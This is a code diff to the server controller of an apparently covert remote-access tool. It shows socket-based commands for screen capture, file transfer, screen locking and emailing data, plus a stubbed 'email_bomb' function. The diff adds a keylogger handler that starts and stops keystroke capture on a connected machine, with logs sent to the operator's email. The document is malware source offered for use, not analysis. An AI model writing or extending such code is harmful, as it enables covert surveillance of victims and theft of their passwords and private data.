@@ -2,7 +2,6 @@ import json
 import socket
 import os
 import time
-import sys
 import uuid
 from cryptography.fernet import Fernet
 
@@ -97,6 +96,7 @@ def send_file():
     strClientResponse = recv(BUFF).decode()
     print(strClientResponse)
 
+
 def lock():
     send(b"lock")
     strResponseSize = recv(BUFF).decode()
@@ -153,14 +153,31 @@ def receive_file():
 def email_bomb():
     pass
 
+
 def keylogger():
-    pass
+    print("[+] Keylogger is running...")
+    send("keylogger".encode())
+    new_order = "start"
+    while new_order.lower() != "stop":
+        if new_order != "stop":
+            print("[+] Keylogs are being sent to your email addres as text file.")
+            print("[+] Please wait...")
+            response = ""
+            while True:
+                response = recv(BUFF).decode()
+                if response == "[+] Give an order(start/stop).":
+                    print(response)
+                    new_order = input("\n>>")
+                    send(new_order.encode())
+                    break
+
 
 def receive_info_as_mail(tobesent):
     send(tobesent)
     responseSize = int(recv(BUFF).decode())
     response = recv(BUFF).decode()
     print(response)
+
 
 def run():
     while True:
@@ -176,6 +193,10 @@ def run():
             lock()
         elif order == "screenshot":
             screenshot()
+
+        elif order == "keylogger":
+            keylogger()
+
         elif order[:4] == "mail":
             receive_info_as_mail(order.encode())
 
@@ -185,8 +206,12 @@ def run():
             strClientResponse = _decode_(recvall(intBuffer))
             print(strClientResponse)
 
-create_encryptor()
-create_socket()
-socket_bind()
-socket_accept()
-run()
+
+def main():
+    create_encryptor()
+    create_socket()
+    socket_bind()
+    socket_accept()
+    run()
+
+main()
